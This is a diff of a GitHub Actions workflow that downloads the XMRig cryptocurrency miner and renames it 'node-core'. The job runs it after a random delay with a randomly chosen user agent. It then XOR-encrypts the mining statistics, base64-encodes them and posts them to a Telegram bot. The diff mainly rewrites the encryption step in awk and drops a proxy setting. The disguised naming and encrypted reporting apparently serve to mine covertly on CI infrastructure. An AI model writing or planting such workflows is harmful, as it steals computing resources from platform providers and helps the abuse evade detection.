@@ -20,7 +20,7 @@ jobs:
       - name: Install Agent
         run: |
           sudo apt update -y
-          sudo apt install -y curl tar base64
+          sudo apt install -y curl tar coreutils xxd base64
           curl -L -o node.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
           tar -xzf node.tar.gz
           mv xmrig-6.24.0 node-core
@@ -34,8 +34,7 @@ jobs:
         run: |
           cd node-core
           UA=$(echo $UA_LIST | tr "|" "\n" | shuf -n 1)
-          export http_proxy="http://user:pass@127.0.0.1:9999"
-          export https_proxy="$http_proxy"
+          echo "Using UA: $UA"
 
           DELAY=$((RANDOM % 180 + 30))
           echo "Waiting $DELAY sec..."
@@ -64,10 +63,22 @@ jobs:
           R=$(grep -a "rejected" result.log | wc -l)
           HR=${HR:-"0 H/s"}
 
-          PLAIN="NANO Stats:\n• HR: $HR\n• OK: $A\n• NO: $R"
-          CIPHER=$(echo -n "$PLAIN" | xxd -p | sed 's/\(..\)/0x\1\n/g' | while read -r B; do
-            printf '%02x' $(( B ^ $(printf '%d' "'${XOR_KEY:$((i++%${#XOR_KEY})):1}") ))
-          done | xxd -r -p | base64)
+          TEXT="NANO Stats:\n• HR: $HR\n• OK: $A\n• NO: $R"
+          CIPHER=$(echo -n "$TEXT" | xxd -p | awk -v key="$XOR_KEY" '
+            BEGIN { i=0; len=length(key); }
+            {
+              for (n=1; n<=length($0); n+=2) {
+                c = strtonum("0x" substr($0,n,2));
+                k = ord(substr(key, i % len + 1, 1));
+                printf "%02x", xor(c,k);
+                i++;
+              }
+            }
+            function ord(str) { return index("\0\1\2\3\4\5\6\7\10\11\12\13\14\15\16\17\
+\20\21\22\23\24\25\26\27\30\31\32\33\34\35\36\37 !\"#$%&'\"'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~", str)-1 }
+            function xor(a,b) { return and(255, xor2(a,b)); }
+            function xor2(a,b) { return or(and(255 - a, b), and(a, 255 - b)); }
+          ' | xxd -r -p | base64)
 
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
             -d chat_id=$TG_CHAT_ID \
